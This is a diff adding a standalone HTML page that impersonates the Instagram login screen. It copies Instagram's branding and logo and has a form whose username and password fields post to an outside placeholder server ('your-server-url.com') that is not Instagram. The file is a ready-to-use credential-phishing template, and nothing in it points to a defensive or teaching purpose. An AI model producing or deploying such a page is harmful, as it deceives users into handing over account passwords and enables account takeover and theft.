@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background: #fff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 350px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #fff;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 120px;
+            height: auto;
+            display: inline-block;
+        }
+        .login-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .login-subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .form-group input::placeholder {
+            color: #999;
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #838383;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+        .login-button:hover {
+            background-color: #666;
+        }
+        .links {
+            text-align: center;
+            font-size: 14px;
+        }
+        .links a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.instagram.com/static/images/ico/favicon.ico/52975a48c4b8.png" alt="Instagram Logo">
+        </div>
+        <div class="login-title">Instagram</div>
+        <div class="login-subtitle">Log in to start sharing photos and videos.</div>
+        <form action="https://your-server-url.com/submit" method="post">
+            <div class="form-group">
+                <input type="text" name="username" placeholder="Username or email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-button">Log In</button>
+            <div class="links">
+                <a href="#">Forgot password?</a>
+            </div>
+            <div class="links" style="margin-top: 20px;">
+                <a href="#">Sign up</a>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
